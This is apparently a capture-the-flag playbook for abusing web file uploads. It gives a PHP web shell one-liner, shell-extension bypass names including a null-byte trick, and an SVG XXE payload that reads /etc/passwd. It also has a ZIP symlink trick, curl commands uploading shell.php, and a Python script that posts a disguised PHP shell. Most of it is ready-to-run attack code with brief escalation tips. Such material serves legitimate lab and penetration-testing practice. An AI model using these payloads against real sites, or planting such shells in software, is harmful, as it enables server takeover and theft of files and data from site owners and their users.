# Web File Upload Abuse

## When to suspect this

- App accepts images, documents, archives, avatars, PDFs, SVG, DOCX, audio, or custom files.
- Uploaded file is later rendered, converted, extracted, scanned, or served.
- Source checks extension/MIME but parser uses file content.
- Error mentions ImageMagick, ExifTool, Ghostscript, CairoSVG, WeasyPrint, unzip, tar, ffmpeg.

## Fast triage checklist

- Upload a benign file and record storage path and served URL.
- Check if file is executable, rendered, converted, or downloaded.
- Test extension and MIME mismatch.
- Test polyglot files.
- Test archive traversal/symlink behavior.
- Test SVG/DOCX/XML XXE.
- Test metadata injection if converters call shell tools.
- Check if uploaded path is reachable through LFI or static serving.

## Manual confirmation

```bash
curl -sk -F 'file=@test.png;type=image/png' http://HOST/upload
curl -sk -I http://HOST/uploads/test.png
curl -sk -F 'file=@shell.php;type=image/png' http://HOST/upload
curl -sk -F 'file=@payload.svg;type=image/svg+xml' http://HOST/upload
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| `file`, `xxd` | Verify polyglot/magic | `file payload` | Expected parser identity |
| `exiftool` | Metadata injection | `exiftool -Comment='PAYLOAD' img.jpg` | Metadata stored/processed |
| `zip`, `tar` | Archive traversal/symlink | `zip -y payload.zip symlink` | Server extracts/follows |
| Burp Repeater | MIME/extension tests | Change `Content-Type` and filename | Different validation |
| [web-lfi-path-traversal.md](web-lfi-path-traversal.md) | Uploaded path can drive file read | Probe upload URL | LFI/source read |

## Payload starter pack

PHP upload:

```php
<?php system($_GET['cmd'] ?? 'id'); ?>
```

Extensions:

```text
shell.php
shell.php.jpg
shell.phtml
shell.phar
shell.php%00.jpg
shell.jpg.php
```

SVG XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

ZIP symlink:

```bash
ln -s /flag flaglink
zip -y payload.zip flaglink
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests

URL = "http://HOST/upload"
COOKIE = {"session": "COOKIE"}

files = {
    "file": ("shell.php.jpg", b"<?php system($_GET['cmd']??'id'); ?>", "image/jpeg")
}
r = requests.post(URL, files=files, cookies=COOKIE, timeout=10)
print(r.status_code, r.text[:1000])
```

## Escalation path

- If upload is served as executable, run minimal `cat /flag*`.
- If static only, use XSS/polyglot or LFI to include it.
- If converter parses file, target parser bug or metadata injection.
- If archive is extracted, test traversal/symlink/write location.
- If PDF/image generation fetches external resources, pivot to SSRF/XXE.

## Common bypasses

- Double extension.
- Null byte in older stacks.
- MIME mismatch.
- Magic bytes prepended to script.
- Case variations.
- `.phar`, `.phtml`, `.shtml`, `.htaccess`.
- PNG/ZIP/PHP, JPEG/HTML, SVG/XML polyglots.
- Filename command injection in tar/git/wget pipelines.

## Rabbit holes

- Assuming PHP execution on non-PHP stacks.
- Uploading shells when file read via parser is enough.
- Ignoring post-upload processing path.
- Missing server-side generated thumbnails/PDFs.
- Trying destructive archive traversal.

## Final solve checklist

- You know validation checks and consumer parser.
- Upload result path is recorded.
- Primitive is proven: execute, read, SSRF, XSS, or write.
- Final payload is minimal and reproducible.

